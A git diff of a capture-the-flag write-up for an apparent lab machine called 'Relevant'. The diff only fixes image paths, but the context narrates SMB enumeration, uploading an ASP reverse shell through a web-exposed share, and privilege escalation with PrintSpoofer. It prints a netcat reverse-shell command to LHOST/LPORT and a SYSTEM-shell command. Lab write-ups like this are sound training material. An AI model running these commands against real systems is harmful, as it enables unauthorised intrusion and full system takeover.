@@ -85,25 +85,25 @@ Host script results:
 
 We see the machine is running SMB so let's enumerate it.
 
-![SMB enum result 1](../assets/posts/relevant/1.png)
+![SMB enum result 1](/assets/posts/relevant/1.png)
 
 We see a share called "nt4wrksv", we can try to log in anonimously
 
-![SMB enum result 2](../assets/posts/relevant/2.png)
+![SMB enum result 2](/assets/posts/relevant/2.png)
 
 There is an interesting file there, we download it so we can have it handy. Let's take a look at its content.
 
-![passwords.txt content](../assets/posts/relevant/3.png)
+![passwords.txt content](/assets/posts/relevant/3.png)
 
 The file contais two encoded user passwords, and we see that they are encoded using base64 at a glance. We could decode them using the console but i preffer using CyberChef.
 
-![passwords.txt content decoded](../assets/posts/relevant/4.png)
+![passwords.txt content decoded](/assets/posts/relevant/4.png)
 
 And here we have it, the passwords for users Bob and Bill.
 After getting these credentials I tried to log in with to SMB and with SSH and it didn't work.
 
-![psexec 1](../assets/posts/relevant/5.png)
-![psexec 2](../assets/posts/relevant/6.png)
+![psexec 1](/assets/posts/relevant/5.png)
+![psexec 2](/assets/posts/relevant/6.png)
 
 However, using psexec we can know that the user Bill is not even real, and Bob is but the password is wrong.
 Here comes the only difficulty of this machine; it is a rabbit hole, as it provides you with fake credentials that have no use at all. So what can we do now?
@@ -116,15 +116,15 @@ Let's go for the easy one first. We saw that using GoBuster directly on the main
 <br>
 We have found that there is a directory with the name "**nt4wrksv**", just like the SMB share we used to enum. When accessing the link we get a blank page but no errors, so we can try to path traversal to check if we can see the contents of the **passwords.txt** file that was in the share.
 
-![nt4wrksv passwords.txt](../assets/posts/relevant/7.png)
+![nt4wrksv passwords.txt](/assets/posts/relevant/7.png)
 
 And yes, we can view the file. Now we have access to a SMB share which can be accessed through browser, so let's craft our ASP reverse shell and stablish initial access to the machine.
 
-![put reverse shell](../assets/posts/relevant/8.png)
-![shell stablished](../assets/posts/relevant/9.png)
+![put reverse shell](/assets/posts/relevant/8.png)
+![shell stablished](/assets/posts/relevant/9.png)
 
 Now we have a shell and list the users to get the first flag.
-![User flag](../assets/posts/relevant/10.png)
+![User flag](/assets/posts/relevant/10.png)
 
 ### Privilege escalation
 First we check for exploitable tokens
@@ -149,6 +149,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 We have the **SeImpersonatePrivilege** token enabled, so no big deal to gain root acess. To do this we will upload PrintSpoofer and a netcat binary. Once we have both uploaded, we start another listener and run PrintSpoofer. You should get a bind shell with this command
 ```PrintSpoofer.exe -c “c:\inetpub\wwwroot\nt4wrksv\nc.exe LHOST LPORT -e cmd”```, but because we just need to check one flag and nothing else I decided to invoke a SYSTEM shell on the same session with ```PrintSpoofer.exe -i -c cmd```.
 
-![Root flag](../assets/posts/relevant/11.png)
+![Root flag](/assets/posts/relevant/11.png)
 
 Finally we get the root flag.
